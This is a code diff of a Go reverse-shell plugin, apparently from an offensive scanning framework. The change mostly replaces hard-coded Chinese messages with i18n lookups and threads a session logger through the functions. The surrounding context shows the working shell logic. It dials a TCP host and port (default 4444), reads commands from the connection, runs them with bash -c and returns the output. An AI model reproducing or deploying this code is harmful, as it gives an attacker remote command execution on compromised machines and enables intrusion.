@@ -63,14 +63,14 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 		port = 4444
 	}
 
-	output.WriteString("=== Go原生反弹Shell ===\n")
-	output.WriteString(fmt.Sprintf("目标: %s\n", target))
-	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))
+	output.WriteString(i18n.GetText("reverseshell_header") + "\n")
+	output.WriteString(i18n.Tr("local_target", target) + "\n")
+	output.WriteString(i18n.Tr("local_platform", runtime.GOOS) + "\n\n")
 
 	// 启动反弹Shell
-	err = p.startNativeReverseShell(ctx, host, port, state)
+	err = p.startNativeReverseShell(ctx, host, port, state, session)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("反弹Shell错误: %v\n", err))
+		output.WriteString(i18n.Tr("reverseshell_error", err) + "\n")
 		return &plugins.Result{
 			Success: false,
 			Output:  output.String(),
@@ -78,8 +78,8 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 		}
 	}
 
-	output.WriteString("✓ 反弹Shell已完成\n")
-	common.LogSuccess(i18n.Tr("reverseshell_complete", target))
+	output.WriteString(i18n.GetText("reverseshell_done") + "\n")
+	session.LogSuccess(i18n.Tr("reverseshell_complete", target))
 
 	return &plugins.Result{
 		Success: true,
@@ -90,15 +90,15 @@ func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, se
 }
 
 // startNativeReverseShell 启动Go原生反弹Shell
-func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host string, port int, state *common.State) error {
+func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host string, port int, state *common.State, session *common.ScanSession) error {
 	// 连接到目标
 	conn, err := net.Dial("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
 	if err != nil {
-		return fmt.Errorf("连接失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("connection_failed_plain"), err)
 	}
 	defer func() { _ = conn.Close() }()
 
-	common.LogSuccess(i18n.Tr("reverseshell_connected", host, port))
+	session.LogSuccess(i18n.Tr("reverseshell_connected", host, port))
 
 	// 设置反弹Shell为活跃状态
 	state.SetReverseShellActive(true)
@@ -141,7 +141,7 @@ func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host s
 			if errors.As(err, &netErr) && netErr.Timeout() {
 				continue
 			}
-			return fmt.Errorf("读取命令错误: %w", err)
+			return fmt.Errorf("%s: %w", i18n.GetText("command_read_failed"), err)
 		}
 
 		// 清理命令
@@ -175,13 +175,13 @@ func (p *ReverseShellPlugin) executeCommand(cmdLine string) string {
 	case "linux", "darwin":
 		cmd = exec.Command("bash", "-c", cmdLine)
 	default:
-		return fmt.Sprintf("不支持的操作系统: %s", runtime.GOOS)
+		return i18n.Tr("unsupported_os", runtime.GOOS)
 	}
 
 	// 执行命令并获取输出
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return fmt.Sprintf("错误: %v\n%s", err, string(output))
+		return i18n.Tr("command_error_with_output", err, string(output))
 	}
 
 	return string(output)
